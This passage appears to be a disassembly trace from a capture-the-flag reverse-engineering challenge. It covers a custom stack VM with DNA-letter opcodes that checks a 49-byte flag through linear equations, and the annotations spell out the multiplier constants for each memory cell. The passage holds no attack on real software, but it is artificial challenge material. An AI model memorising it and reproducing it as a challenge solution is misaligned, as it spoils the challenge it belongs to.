pop())\n08214 : GTTCTGGTTTTT     push(mem[#0284])\n08220 : TTGACCTTTTTT     push(#0000005e)\n0822c : GC               push(pop() * pop())\n0822e : GTCCTGGTTTTT     push(mem[#0285])\n0823a : TTCAACTTTTTT     push(#0000007d)\n08246 : GC               push(pop() * pop())\n08248 : GTGCTGGTTTTT     push(mem[#0286])\n08254 : TTGCTTTTTTTT     push(#00000006)\n08260 : GC               push(pop() * pop())\n08262 : GTACTGGTTTTT     push(mem[#0287])\n0826e : TTCGGTTTTTTT     push(#00000029)\n0827a : GC               push(pop() * pop())\n0827c : GTTGTGGTTTTT     push(mem[#0288])\n08288 : TTTTGGTTTTTT     push(#000000a0)\n08294 : GC               push(pop() * pop())\n08296 : GTCGTGGTTTTT     push(mem[#0289])\n082a2 : TTCACGTTTTTT     push(#0000009d)\n082ae : GC               push(pop() * pop())\n082b0 : GTGGTGGTTTTT     push(mem[#028a])\n082bc : TTGCAGTTTTTT     push(#000000b6)\n082c8 : GC               push(pop() * pop())\n082ca : GTAGTGGTTTTT     push(mem[#028b])\n082d6 : TTTGTATTTTTT     push(#000000c8)\n082e2 : GC               push(pop() * pop())\n082e4 : GTTATGGTTTTT     push(mem[#028c])\n082f0 : TTGGCGTTTTTT     push(#0000009a)\n082fc : GC               push(pop() * pop())\n082fe : GTCATGGTTTTT     push(mem[#028d])\n0830a : TTGTTCTTTTTT     push(#00000042)\n08316 : GC               push(pop() * pop())\n08318 : GTGATGGTTTTT     push(mem[#028e])\n08324 : TTTCCATTTTTT     push(#000000d4)\n08330 : GC               push(pop() * pop())\n08332 : GTAATGGTTTTT     push(mem[#028f])\n0833e : TTACGATTTTTT     push(#000000e7)\n0834a : GC               push(pop() * pop())\n0834c : GTTTCGGTTTTT     push(mem[#0290])\n08358 : TTCATCTTTTTT     push(#0000004d)\n08364 : GC               push(pop() * pop())\n08366 : GTCTCGGTTTTT     push(mem[#0291])\n08372 : TTGGGTTTTTTT     push(#0000002a)\n0837e : GC               push(pop() * pop())\n08380 : GTGTCGGTTTTT     push(mem[#0292])\n0838c : TTCGAATTTTTT     push(#000000f9)\n08398 : GC               push(pop() * pop())\n0839a : GTATCGGTTTTT     push(mem[#0293])\n083a6 : TTCAACTTTTTT     push(#0000007d)\n083b2 : GC               push(pop() * pop())\n083b4 : GTTCCGGTTTTT     push(mem[#0294])\n083c0 : TTCTTGTTTTTT     push(#00000081)\n083cc : GC               push(pop() * pop())\n083ce : GTCCCGGTTTTT     push(mem[#0295])\n083da : TTTTCATTTTTT     push(#000000d0)\n083e6 : GC               push(pop() * pop())\n083e8 : GTGCCGGTTTTT     push(mem[#0296])\n083f4 : TTTTTGTTTTTT     push(#00000080)\n08400 : GC               push(pop() * pop())\n08402 : GTACCGGTTTTT     push(mem[#0297])\n0840e : TTTCCTTTTTTT     push(#00000014)\n0841a : GC               push(pop() * pop())\n0841c : GTTGCGGTTTTT     push(mem[#0298])\n08428 : TTTTTATTTTTT     push(#000000c0)\n08434 : GC               push(pop() * pop())\n08436 : GTCGCGGTTTTT     push(mem[#0299])\n08442 : TTATAATTTTTT     push(#000000f3)\n0844e : GC               push(pop() * pop())\n08450 : GTGGCGGTTTTT     push(mem[#029a])\n0845c : TTCTGTTTTTTT     push(#00000021)\n08468 : GC               push(pop() * pop())\n0846a : GTAGCGGTTTTT     push(mem[#029b])\n08476 : TTGTGGTTTTTT     push(#000000a2)\n08482 : GC               push(pop() * pop())\n08484 : GTTACGGTTTTT     push(mem[#029c])\n08490 : TTCTCTTTTTTT     push(#00000011)\n0849c : GC               push(pop() * pop())\n0849e : GTCACGGTTTTT     push(mem[#029d])\n084aa : TTTCGGTTTTTT     push(#000000a4)\n084b6 : GC               push(pop() * pop())\n084b8 : GTGACGGTTTTT     push(mem[#029e])\n084c4 : TTGACCTTTTTT     push(#0000005e)\n084d0 : GC               push(pop() * pop())\n084d2 : GTAACGGTTTTT     push(mem[#029f])\n084de : TTGCAATTTTTT     push(#000000f6)\n084ea : GC               push(pop() * pop())\n084ec : GTTTGGGTTTTT     push(mem[#02a0])\n084f8 : TTGGAGTTTTTT     push(#000000ba)\n08504 : GC               push(pop() * pop())\n08506 : GTCTGGGTTTTT     push(mem[#02a1])\n08512 : TTAATGTTTTTT     push(#0000008f)\n0851e : GC               push(pop() * pop())\n08520 : GTGTGGGTTTTT     push(mem[#02a2])\n0852c : TTGTATTTTTTT     push(#00000032)\n08538 : GC               push(pop() * pop())\n0853a : GTATGGGTTTTT     push(mem[#02a3])\n08546 : TTCGAGTTTTTT     push(#000000b9)\n08552 : GC               push(pop() * pop())\n08554 : GTTCGGGTTTTT     push(mem[#02a4])\n08560 : TTTGAATTTTTT     push(#000000f8)\n0856c : GC               push(pop() * pop())\n0856e : GTCCGGGTTTTT     push(mem[#02a5])\n0857a : TTGGAGTTTTTT     push(#000000ba)\n08586 : GC               push(pop() * pop())\n08588 : GTGCGGGTTTTT     push(mem[#02a6])\n08594 : TTAGACTTTTTT     push(#0000007b)\n085a0 : GC               push(pop() * pop())\n085a2 : GTACGGGTTTTT     push(mem[#02a7])\n085ae : TTTAATTTTTTT     push(#0000003c)\n085ba : GC               push(pop() * pop())\n085bc : GTTGGGGTTTTT     push(mem[#02a8])\n085c8 : TTTTCCTTTTTT     push(#00000050)\n085d4 : GC               push(pop() * pop())\n085d6 : GTCGGGGTTTTT     push(mem[#02a9])\n085e2 : TTGTTCTTTTTT     push(#00000042)\n085ee : GC               push(pop() * pop())\n085f0 : GTGGGGGTTTTT     push(mem[#02aa])\n085fc : TTGAATTTTTTT     push(#0000003e)\n08608 : GC               push(pop() * pop())\n0860a : GTAGGGGTTTTT     push(mem[#02ab])\n08616 : TTCTGTTTTTTT     push(#00000021)\n08622 : GC               push(pop() * pop())\n08624 : GTTAGGGTTTTT     push(mem[#02ac])\n08630 : TTACAATTTTTT     push(#000000f7)\n0863c : GC               push(pop() * pop())\n0863e : GTCAGGGTTTTT     push(mem[#02ad])\n0864a : TTCTTGTTTTTT     push(#00000081)\n08656 : GC               push(pop() * pop())\n08658 : GTGAGGGTTTTT     push(mem[#02ae])\n08664 : TTTGTTTTTTTT     push(#00000008)\n08670 : GC               push(pop() * pop())\n08672 : GTAAGGGTTTTT     push(mem[#02af])\n0867e : TTAAGATTTTTT     push(#000000ef)\n0868a : GC               push(pop() * pop())\n0868c : GTTTAGGTTTTT     push(mem[#02b0])\n08698 : TTAACTTTTTTT     push(#0000001f)\n086a4 : GC               push(pop() * pop())\n086a6 : TC               push(pop() + pop())\n086a8 : TC               push(pop() + pop())\n086aa : TC               push(pop() + pop())\n086ac : TC               push(pop() + pop())\n086ae : TC               push(pop() + pop())\n086b0 : TC               push(pop() + pop())\n086b2 : TC               push(pop() + pop())\n086b4 : TC               push(pop() + pop())\n086b6 : TC               push(pop() + pop())\n086b8 : TC               push(pop() + pop())\n086ba : TC               push(pop() + pop())\n086bc : TC               push(pop() + pop())\n086be : TC               push(pop() + pop())\n086c0 : TC               push(pop() + pop())\n086c2 : TC               push(pop() + pop())\n086c4 : TC               push(pop() + pop())\n086c6 : TC               push(pop() + pop())\n086c8 : TC               push(pop() + pop())\n086ca : TC               push(pop() + pop())\n086cc : TC               push(pop() + pop())\n086ce : TC               push(pop() + pop())\n086d0 : TC               push(pop() + pop())\n086d2 : TC               push(pop() + pop())\n086d4 : TC               push(pop() + pop())\n086d6 : TC               push(pop() + pop())\n086d8 : TC               push(pop() + pop())\n086da : TC               push(pop() + pop())\n086dc : TC               push(pop() + pop())\n086de : TC               push(pop() + pop())\n086e0 : TC               push(pop() + pop())\n086e2 : TC               push(pop() + pop())\n086e4 : TC               push(pop() + pop())\n086e6 : TC               push(pop() + pop())\n086e8 : TC               push(pop() + pop())\n086ea : TC               push(pop() + pop())\n086ec : TC               push(pop() + pop())\n086ee : TC               push(pop() + pop())\n086f0 : TC               push(pop() + pop())\n086f2 : TC               push(pop() + pop())\n086f4 : TC               push(pop() + pop())\n086f6 : TC               push(pop() + pop())\n086f8 : TC               push(pop() + pop())\n086fa : TC               push(pop() + pop())\n086fc : TC               push(pop() + pop())\n086fe : TC               push(pop() + pop())\n08700 : TC               push(pop() + pop())\n08702 : TC               push(pop() + pop())\n08704 : TC               push(pop() + pop())\n08706 : ATTTGCTTCTTT     mem[#1060] := pop()           memory[#01060] := ((flag[0] * 80) + ((flag[1] * 17) + ((flag[2] * 66) + ((flag[3] * 212) + ((flag[4] * 94) + ((flag[5] * 125) + ((flag[6] * 6) + ((flag[7] * 41) + ((flag[8] * 160) + ((flag[9] * 157) + ((flag[10] * 182) + ((flag[11] * 200) + ((flag[12] * 154) + ((flag[13] * 66) + ((flag[14] * 212) + ((flag[15] * 231) + ((flag[16] * 77) + ((flag[17] * 42) + ((flag[18] * 249) + ((flag[19] * 125) + ((flag[20] * 129) + ((flag[21] * 208) + ((flag[22] * 128) + ((flag[23] * 20) + ((flag[24] * 192) + ((flag[25] * 243) + ((flag[26] * 33) + ((flag[27] * 162) + ((flag[28] * 17) + ((flag[29] * 164) + ((flag[30] * 94) + ((flag[31] * 246) + ((flag[32] * 186) + ((flag[33] * 143) + ((flag[34] * 50) + ((flag[35] * 185) + ((flag[36] * 248) + ((flag[37] * 186) + ((flag[38] * 123) + ((flag[39] * 60) + ((flag[40] * 80) + ((flag[41] * 66) + ((flag[42] * 62) + ((flag[43] * 33) + ((flag[44] * 247) + ((flag[45] * 129) + ((flag[46] * 8) + ((flag[47] * 239) + (flag[48] * 31)))))))))))))))))))))))))))))))))))))))))))))))))\n08712 : GTTTTGGTTTTT     push(mem[#0280])\n0871e : TTCTCCTTTTTT     push(#00000051)\n0872a : GC               push(pop() * pop())\n0872c : GTCTTGGTTTTT     push(mem[#0281])\n08738 : TTAGTGTTTTTT     push(#0000008b)\n08744 : GC               push(pop() * pop())\n08746 : GTGTTGGTTTTT     push(mem[#0282])\n08752 : TTCGCTTTTTTT     push(#00000019)\n0875e : GC               push(pop() * pop())\n08760 : GTATTGGTTTTT     push(mem[#0283])\n0876c : TTCGATTTTTTT     push(#00000039)\n08778 : GC               push(pop() * pop())\n0877a : GTTCTGGTTTTT     push(mem[#0284])\n08786 : TTCGGATTTTTT     push(#000000e9)\n08792 : GC               push(pop() * pop())\n08794 : GTCCTGGTTTTT     push(mem[#0285])\n087a0 : TTCCGATTTTTT     push(#000000e5)\n087ac : GC               push(pop() * pop())\n087ae : GTGCTGGTTTTT     push(mem[#0286])\n087ba : TTCGAGTTTTTT     push(#000000b9)\n087c6 : GC               push(pop() * pop())\n087c8 : GTACTGGTTTTT     push(mem[#0287])\n087d4 : TTTTGCTTTTTT     push(#00000060)\n087e0 : GC               push(pop() * pop())\n087e2 : GTTGTGGTTTTT     push(mem[#0288])\n087ee : TTCAGGTTTTTT     push(#000000ad)\n087fa : GC               push(pop() * pop())\n087fc : GTCGTGGTTTTT     push(mem[#0289])\n08808 : TTGCCTTTTTTT     push(#00000016)\n08814 : GC               push(pop() * pop())\n08816 : GTGGTGGTTTTT     push(mem[#028a])\n08822 : TTAAGTTTTTTT     push(#0000002f)\n0882e : GC               push(pop() * pop())\n08830 : GTAGTGGTTTTT     push(mem[#028b])\n0883c : TTCCGTTTTTTT     push(#00000025)\n08848 : GC               push(pop() * pop())\n0884a : GTTATGGTTTTT     push(mem[#028c])\n08856 : TTTGGCTTTTTT     push(#00000068)\n08862 : GC               push(pop() * pop())\n08864 : GTCATGGTTTTT     push(mem[#028d])\n08870 : TTTTTGTTTTTT     push(#00000080)\n0887c : GC               push(pop() * pop())\n0887e : GTGATGGTTTTT     push(mem[#028e])\n0888a : TTTCCTTTTTTT     push(#00000014)\n08896 : GC               push(pop() * pop())\n08898 : GTAATGGTTTTT     push(mem[#028f])\n088a4 : TTCCTGTTTTTT     push(#00000085)\n088b0 : GC               push(pop() * pop())\n088b2 : GTTTCGGTTTTT     push(mem[#0290])\n088be : TTTTAGTTTTTT     push(#000000b0)\n088ca : GC               push(pop() * pop())\n088cc : GTCTCGGTTTTT     push(mem[#0291])\n088d8 : TTGTATTTTTTT     push(#00000032)\n088e4 : GC               push(pop() * pop())\n088e6 : GTGTCGGTTTTT     push(mem[#0292])\n088f2 : TTCCGTTTTTTT     push(#00000025)\n088fe : GC               push(pop() * pop())\n08900 : GTATCGGTTTTT     push(mem[#0293])\n0890c : TTGGAATTTTTT     push(#000000fa)\n08918 : GC               push(pop() * pop())\n0891a : GTTCCGGTTTTT     push(mem[#0294])\n08926 : TTTCCCTTTTTT     push(#00000054)\n08932 : GC               push(pop() * pop())\n08934 : GTCCCGGTTTTT     push(mem[#0295])\n08940 : TTCATTTTTTTT     push(#0000000d)\n0894c : GC               push(pop() * pop())\n0894e : GTGCCGGTTTTT     push(mem[#0296])\n0895a : TTGCAATTTTTT     push(#000000f6)\n08966 : GC               push(pop() * pop())\n08968 : GTACCGGTTTTT     push(mem[#0297])\n08974 : TTTGTCTTTTTT     push(#00000048)\n08980 : GC               push(pop() * pop())\n08982 : GTTGCGGTTTTT     push(mem[#0298])\n0898e : TTGCGCTTTTTT     push(#00000066)\n0899a : GC               push(pop() * pop())\n0899c : GTCGCGGTTTTT     push(mem[#0299])\n089a8 : TTACCTTTTTTT     push(#00000017)\n089b4 : GC               push(pop() * pop())\n089b6 : GTGGCGGTTTTT     push(mem[#029a])\n089c2 : TTGACTTTTTTT     push(#0000001e)\n089ce : GC               push(pop() * pop())\n089d0 : GTAGCGGTTTTT     push(mem[#029b])\n089dc : TTTATATTTTTT     push(#000000cc)\n089e8 : GC               push(pop() * pop())\n089ea : GTTACGGTTTTT     push(mem[#029c])\n089f6 : TTACGATTTTTT     push(#000000e7)\n08a02 : GC               push(pop() * pop())\n08a04 : GTCACGGTTTTT     push(mem[#029d])\n08a10 : TTGTGCTTTTTT     push(#00000062)\n08a1c : GC               push(pop() * pop())\n08a1e : GTGACGGTTTTT     push(mem[#029e])\n08a2a : TTCTCTTTTTTT     push(#00000011)\n08a36 : GC               push(pop() * pop())\n08a38 : GTAACGGTTTTT     push(mem[#029f])\n08a44 : TTGGGCTTTTTT     push(#0000006a)\n08a50 : GC               push(pop() * pop())\n08a52 : GTTTGGGTTTTT     push(mem[#02a0])\n08a5e : TTACGTTTTTTT     push(#00000027)\n08a6a : GC               push(pop() * pop())\n08a6c : GTCTGGGTTTTT     push(mem[#02a1])\n08a78 : TTCTTTTTTTTT     push(#00000001)\n08a84 : GC               push(pop() * pop())\n08a86 : GTGTGGGTTTTT     push(mem[#02a2])\n08a92 : TTACTTTTTTTT     push(#00000007)\n08a9e : GC               push(pop() * pop())\n08aa0 : GTATGGGTTTTT     push(mem[#02a3])\n08aac : TTCAAATTTTTT     push(#000000fd)\n08ab8 : GC               push(pop() * pop())\n08aba : GTTCGGGTTTTT     push(mem[#02a4])\n08ac6 : TTGACCTTTTTT     push(#0000005e)\n08ad2 : GC               push(pop() * pop())\n08ad4 : GTCCGGGTTTTT     push(mem[#02a5])\n08ae0 : TTGCGATTTTTT     push(#000000e6)\n08aec : GC               push(pop() * pop())\n08aee : GTGCGGGTTTTT     push(mem[#02a6])\n08afa : TTACCCTTTTTT     push(#00000057)\n08b06 : GC               push(pop() * pop())\n08b08 : GTACGGGTTTTT     push(mem[#02a7])\n08b14 : TTTTGTTTTTTT     push(#00000020)\n08b20 : GC               push(pop() * pop())\n08b22 : GTTGGGGTTTTT     push(mem[#02a8])\n08b2e : TTAAAGTTTTTT     push(#000000bf)\n08b3a : GC               push(pop() * pop())\n08b3c : GTCGGGGTTTTT     push(mem[#02a9])\n08b48 : TTACCTTTTTTT     push(#00000017)\n08b54 : GC               push(pop() * pop())\n08b56 : GTGGGGGTTTTT     push(mem[#02aa])\n08b62 : TTACGGTTTTTT     push(#000000a7)\n08b6e : GC               push(pop() * pop())\n08b70 : GTAGGGGTTTTT     push(mem[#02ab])\n08b7c : TTGCCGTTTTTT     push(#00000096)\n08b88 : GC               push(pop() * pop())\n08b8a : GTTAGGGTTTTT     push(mem[#02ac])\n08b96 : TTTATGTTTTTT     push(#0000008c)\n08ba2 : GC               push(pop() * pop())\n08ba4 : GTCAGGGTTTTT     push(mem[#02ad])\n08bb0 : TTACATTTTTTT     push(#00000037)\n08bbc : GC               push(pop() * pop())\n08bbe : GTGAGGGTTTTT     push(mem[#02ae])\n08bca : TTTTCCTTTTTT     push(#00000050)\n08bd6 : GC               push(pop() * pop())\n08bd8 : GTAAGGGTTTTT     push(mem[#02af])\n08be4 : TTATTCTTTTTT     push(#00000043)\n08bf0 : GC               push(pop() * pop())\n08bf2 : GTTTAGGTTTTT     push(mem[#02b0])\n08bfe : TTACACTTTTTT     push(#00000077)\n08c0a : GC               push(pop() * pop())\n08c0c : TC               push(pop() + pop())\n08c0e : TC               push(pop() + pop())\n08c10 : TC               push(pop() + pop())\n08c12 : TC               push(pop() + pop())\n08c14 : TC               push(pop() + pop())\n08c16 : TC               push(pop() + pop())\n08c18 : TC               push(pop() + pop())\n08c1a : TC               push(pop() + pop())\n08c1c : TC               push(pop() + pop())\n08c1e : TC               push(pop() + pop())\n08c20 : TC               push(pop() + pop())\n08c22 : TC               push(pop() + pop())\n08c24 : TC               push(pop() + pop())\n08c26 : TC               push(pop() + pop())\n08c28 : TC               push(pop() + pop())\n08c2a : TC               push(pop() + pop())\n08c2c : TC               push(pop() + pop())\n08c2e : TC               push(pop() + pop())\n08c30 : TC               push(pop() + pop())\n08c32 : TC               push(pop() + pop())\n08c34 : TC               push(pop() + pop())\n08c36 : TC               push(pop() + pop())\n08c38 : TC               push(pop() + pop())\n08c3a : TC               push(pop() + pop())\n08c3c : TC               push(pop() + pop())\n08c3e : TC               push(pop() + pop())\n08c40 : TC               push(pop() + pop())\n08c42 : TC               push(pop() + pop())\n08c44 : TC               push(pop() + pop())\n08c46 : TC               push(pop() + pop())\n08c48 : TC               push(pop() + pop())\n08c4a : TC               push(pop() + pop())\n08c4c : TC               push(pop() + pop())\n08c4e : TC               push(pop() + pop())\n08c50 : TC               push(pop() + pop())\n08c52 : TC               push(pop() + pop())\n08c54 : TC               push(pop() + pop())\n08c56 : TC               push(pop() + pop())\n08c58 : TC               push(pop() + pop())\n08c5a : TC               push(pop() + pop())\n08c5c : TC               push(pop() + pop())\n08c5e : TC               push(pop() + pop())\n08c60 : TC               push(pop() + pop())\n08c62 : TC               push(pop() + pop())\n08c64 : TC               push(pop() + pop())\n08c66 : TC               push(pop() + pop())\n08c68 : TC               push(pop() + pop())\n08c6a : TC               push(pop() + pop())\n08c6c : ATTCGCTTCTTT     mem[#1064] := pop()           memory[#01064] := ((flag[0] * 81) + ((flag[1] * 139) + ((flag[2] * 25) + ((flag[3] * 57) + ((flag[4] * 233) + ((flag[5] * 229) + ((flag[6] * 185) + ((flag[7] * 96) + ((flag[8] * 173) + ((flag[9] * 22) + ((flag[10] * 47) + ((flag[11] * 37) + ((flag[12] * 104) + ((flag[13] * 128) + ((flag[14] * 20) + ((flag[15] * 133) + ((flag[16] * 176) + ((flag[17] * 50) + ((flag[18] * 37) + ((flag[19] * 250) + ((flag[20] * 84) + ((flag[21] * 13) + ((flag[22] * 246) + ((flag[23] * 72) + ((flag[24] * 102) + ((flag[25] * 23) + ((flag[26] * 30) + ((flag[27] * 204) + ((flag[28] * 231) + ((flag[29] * 98) + ((flag[30] * 17) + ((flag[31] * 106) + ((flag[32] * 39) + ((flag[33] * 1) + ((flag[34] * 7) + ((flag[35] * 253) + ((flag[36] * 94) + ((flag[37] * 230) + ((flag[38] * 87) + ((flag[39] * 32) + ((flag[40] * 191) + ((flag[41] * 23) + ((flag[42] * 167) + ((flag[43] * 150) + ((flag[44] * 140) + ((flag[45] * 55) + ((flag[46] * 80) + ((flag[47] * 67) + (flag[48] * 119)))))))))))))))))))))))))))))))))))))))))))))))))\n08c78 : GTTTTGGTTTTT     push(mem[#0280])\n08c84 : TTCGGCTTTTTT     push(#00000069)\n08c90 : GC               push(pop() * pop())\n08c92 : GTCTTGGTTTTT     push(mem[#0281])\n08c9e : TTTCTATTTTTT     push(#000000c4)\n08caa : GC               push(pop() * pop())\n08cac : GTGTTGGTTTTT     push(mem[#0282])\n08cb8 : TTGGCCTTTTTT     push(#0000005a)\n08cc4 : GC               push(pop() * pop())\n08cc6 : GTATTGGTTTTT     push(mem[#0283])\n08cd2 : TTTCTATTTTTT     push(#000000c4)\n08cde : GC               push(pop() * pop())\n08ce0 : GTTCTGGTTTTT     push(mem[#0284])\n08cec : TTTAACTTTTTT     push(#0000007c)\n08cf8 : GC               push(pop() * pop())\n08cfa : GTCCTGGTTTTT     push(mem[#0285])\n08d06 : TTCAAATTTTTT     push(#000000fd)\n08d12 : GC               push(pop() * pop())\n08d14 : GTGCTGGTTTTT     push(mem[#0286])\n08d20 : TTATGTTTTTTT     push(#00000023)\n08d2c : GC               push(pop() * pop())\n08d2e : GTACTGGTTTTT     push(mem[#0287])\n08d3a : TTTTTTTTTTTT     push(#00000000)\n08d46 : GC               push(pop() * pop())\n08d48 : GTTGTGGTTTTT     push(mem[#0288])\n08d54 : TTAGCCTTTTTT     push(#0000005b)\n08d60 : GC               push(pop() * pop())\n08d62 : GTCGTGGTTTTT     push(mem[#0289])\n08d6e : TTAATGTTTTTT     push(#0000008f)\n08d7a : GC               push(pop() * pop())\n08d7c : GTGGTGGTTTTT     push(mem[#028a])\n08d88 : TTGGACTTTTTT     push(#0000007a)\n08d94 : GC               push(pop() * pop())\n08d96 : GTAGTGGTTTTT     push(mem[#028b])\n08da2 : TTTTAGTTTTTT     push(#000000b0)\n08dae : GC               push(pop() * pop())\n08db0 : GTTATGGTTTTT     push(mem[#028c])\n08dbc : TTACTCTTTTTT     push(#00000047)\n08dc8 : GC               push(pop() * pop())\n08dca : GTCATGGTTTTT     push(mem[#028d])\n08dd6 : TTACCATTTTTT     push(#000000d7)\n08de2 : GC               push(pop() * pop())\n08de4 : GTGATGGTTTTT     push(mem[#028e])\n08df0 : TTCCTTTTTTTT     push(#00000005)\n08dfc : GC               push(pop() * pop())\n08dfe : GTAATGGTTTTT     push(mem[#028f])\n08e0a : TTTAGCTTTTTT     push(#0000006c)\n08e16 : GC               push(pop() * pop())\n08e18 : GTTTCGGTTTTT     push(mem[#0290])\n08e24 : TTGGACTTTTTT     push(#0000007a)\n08e30 : GC               push(pop() * pop())\n08e32 : GTCTCGGTTTTT     push(mem[#0291])\n08e3e : TTTAAATTTTTT     push(#000000fc)\n08e4a : GC               push(pop() * pop())\n08e4c : GTGTCGGTTTTT     push(mem[#0292])\n08e58 : TTTAAGTTTTTT     push(#000000bc)\n08e64 : GC               push(pop() * pop())\n08e66 : GTATCGGTTTTT     push(mem[#0293])\n08e72 : TTAGCATTTTTT     push(#000000db)\n08e7e : GC               push(pop() * pop())\n08e80 : GTTCCGGTTTTT     push(mem[#0294])\n08e8c : TTTGTATTTTTT     push(#000000c8)\n08e98 : GC               push(pop() * pop())\n08e9a : GTCCCGGTTTTT     push(mem[#0295])\n08ea6 : TTAACGTTTTTT     push(#0000009f)\n08eb2 : GC               push(pop() * pop())\n08eb4 : GTGCCGGTTTTT     push(mem[#0296])\n08ec0 : TTAACGTTTTTT     push(#0000009f)\n08ecc : GC               push(pop() * pop())\n08ece : GTACCGGTTTTT     push(mem[#0297])\n08eda : TTCTAATTTTTT     push(#000000f1)\n08ee6 : GC               push(pop() * pop())\n08ee8 : GTTGCGGTTTTT     push(mem[#0298])\n08ef4 : TTTGGATTTTTT     push(#000000e8)\n08f00 : GC               push(pop() * pop())\n08f02 : GTCGCGGTTTTT     push(mem[#0299])\n08f0e : TTATCCTTTTTT     push(#00000053)\n08f1a : GC               push(pop() * pop())\n08f1c : GTGGCGGTTTTT     push(mem[#029a])\n08f28 : TTAATCTTTTTT     push(#0000004f)\n08f34 : GC               push(pop() * pop())\n08f36 : GTAGCGGTTTTT     push(mem[#029b])\n08f42 : TTCTCTTTTTTT     push(#00000011)\n08f4e : GC               push(pop() * pop())\n08f50 : GTTACGGTTTTT     push(mem[#029c])\n08f5c : TTGTTATTTTTT     push(#000000c2)\n08f68 : GC               push(pop() * pop())\n08f6a : GTCACGGTTTTT     push(mem[#029d])\n08f76 : TTTTCATTTTTT     push(#000000d0)\n08f82 : GC               push(pop() * pop())\n08f84 : GTGACGGTTTTT     push(mem[#029e])\n08f90 : TTAATTTTTTTT     push(#0000000f)\n08f9c : GC               push(pop() * pop())\n08f9e : GTAACGGTTTTT     push(mem[#029f])\n08faa : TTGAATTTTTTT     push(#0000003e)\n08fb6 : GC               push(pop() * pop())\n08fb8 : GTTTGGGTTTTT     push(mem[#02a0])\n08fc4 : TTATTCTTTTTT     push(#00000043)\n08fd0 : GC               push(pop() * pop())\n08fd2 : GTCTGGGTTTTT     push(mem[#02a1])\n08fde : TTTTCCTTTTTT     push(#00000050)\n08fea : GC               push(pop() * pop())\n08fec : GTGTGGGTTTTT     push(mem[#02a2])\n08ff8 : TTAGACTTTTTT     push(#0000007b)\n09004 : GC               push(pop() * pop())\n09006 : GTATGGGTTTTT     push(mem[#02a3])\n09012 : TTCACTTTTTTT     push(#0000001d)\n0901e : GC               push(pop() * pop())\n09020 : GTTCGGGTTTTT     push(mem[#02a4])\n0902c : TTAAGTTTTTTT     push(#0000002f)\n09038 : GC               push(pop() * pop())\n0903a : GTCCGGGTTTTT     push(mem[#02a5])\n09046 : TTTGGGTTTTTT     push(#000000a8)\n09052 : GC               push(pop() * pop())\n09054 : GTGCGGGTTTTT     push(mem[#02a6])\n09060 : TTGGGATTTTTT     push(#000000ea)\n0906c : GC               push(pop() * pop())\n0906e : GTACGGGTTTTT     push(mem[#02a7])\n0907a : TTTCTCTTTTTT     push(#00000044)\n09086 : GC               push(pop() * pop())\n09088 : GTTGGGGTTTTT     push(mem[#02a8])\n09094 : TTTGATTTTTTT     push(#00000038)\n090a0 : GC               push(pop() * pop())\n090a2 : GTCGGGGTTTTT     push(mem[#02a9])\n090ae : TTTGCTTTTTTT     push(#00000018)\n090ba : GC               push(pop() * pop())\n090bc : GTGGGGGTTTTT     push(mem[#02aa])\n090c8 : TTGAGTTTTTTT     push(#0000002e)\n090d4 : GC               push(pop() * pop())\n090d6 : GTAGGGGTTTTT     push(mem[#02ab])\n090e2 : TTCAGTTTTTTT     push(#0000002d)\n090ee : GC               push(pop() * pop())\n090f0 : GTTAGGGTTTTT     push(mem[#02ac])\n090fc : TTCGCCTTTTTT     push(#00000059)\n09108 : GC               push(pop() * pop())\n0910a : GTCAGGGTTTTT     push(mem[#02ad])\n09116 : TTGAGTTTTTTT     push(#0000002e)\n09122 : GC               push(pop() * pop())\n09124 : GTGAGGGTTTTT     push(mem[#02ae])\n09130 : TTTCTGTTTTTT     push(#00000084)\n0913c : GC               push(pop() * pop())\n0913e : GTAAGGGTTTTT     push(mem[#02af])\n0914a : TTCACATTTTTT     push(#000000dd)\n09156 : GC               push(pop() * pop())\n09158 : GTTTAGGTTTTT     push(mem[#02b0])\n09164 : TTGCCCTTTTTT     push(#00000056)\n09170 : GC               push(pop() * pop())\n09172 : TC               push(pop() + pop())\n09174 : TC               push(pop() + pop())\n09176 : TC               push(pop() + pop())\n09178 : TC               push(pop() + pop())\n0917a : TC               push(pop() + pop())\n0917c : TC               push(pop() + pop())\n0917e : TC               push(pop() + pop())\n09180 : TC               push(pop() + pop())\n09182 : TC               push(pop() + pop())\n09184 : TC               push(pop() + pop())\n09186 : TC               push(pop() + pop())\n09188 : TC               push(pop() + pop())\n0918a : TC               push(pop() + pop())\n0918c : TC               push(pop() + pop())\n0918e : TC               push(pop() + pop())\n09190 : TC               push(pop() + pop())\n09192 : TC               push(pop() + pop())\n09194 : TC               push(pop() + pop())\n09196 : TC               push(pop() + pop())\n09198 : TC               push(pop() + pop())\n0919a : TC               push(pop() + pop())\n0919c : TC               push(pop() + pop())\n0919e : TC               push(pop() + pop())\n091a0 : TC               push(pop() + pop())\n091a2 : TC               push(pop() + pop())\n091a4 : TC               push(pop() + pop())\n091a6 : TC               push(pop() + pop())\n091a8 : TC               push(pop() + pop())\n091aa : TC               push(pop() + pop())\n091ac : TC               push(pop() + pop())\n091ae : TC               push(pop() + pop())\n091b0 : TC               push(pop() + pop())\n091b2 : TC               push(pop() + pop())\n091b4 : TC               push(pop() + pop())\n091b6 : TC               push(pop() + pop())\n091b8 : TC               push(pop() + pop())\n091ba : TC               push(pop() + pop())\n091bc : TC               push(pop() + pop())\n091be : TC               push(pop() + pop())\n091c0 : TC               push(pop() + pop())\n091c2 : TC               push(pop() + pop())\n091c4 : TC               push(pop() + pop())\n091c6 : TC               push(pop() + pop())\n091c8 : TC               push(pop() + pop())\n091ca : TC               push(pop() + pop())\n091cc : TC               push(pop() + pop())\n091ce : TC               push(pop() + pop())\n091d0 : TC               push(pop() + pop())\n091d2 : ATTGGCTTCTTT     mem[#1068] := pop()           memory[#01068] := ((flag[0] * 105) + ((flag[1] * 196) + ((flag[2] * 90) + ((flag[3] * 196) + ((flag[4] * 124) + ((flag[5] * 253) + ((flag[6] * 35) + ((flag[7] * 0) + ((flag[8] * 91) + ((flag[9] * 143) + ((flag[10] * 122) + ((flag[11] * 176) + ((flag[12] * 71) + ((flag[13] * 215) + ((flag[14] * 5) + ((flag[15] * 108) + ((flag[16] * 122) + ((flag[17] * 252) + ((flag[18] * 188) + ((flag[19] * 219) + ((flag[20] * 200) + ((flag[21] * 159) + ((flag[22] * 159) + ((flag[23] * 241) + ((flag[24] * 232) + ((flag[25] * 83) + ((flag[26] * 79) + ((flag[27] * 17) + ((flag[28] * 194) + ((flag[29] * 208) + ((flag[30] * 15) + ((flag[31] * 62) + ((flag[32] * 67) + ((flag[33] * 80) + ((flag[34] * 123) + ((flag[35] * 29) + ((flag[36] * 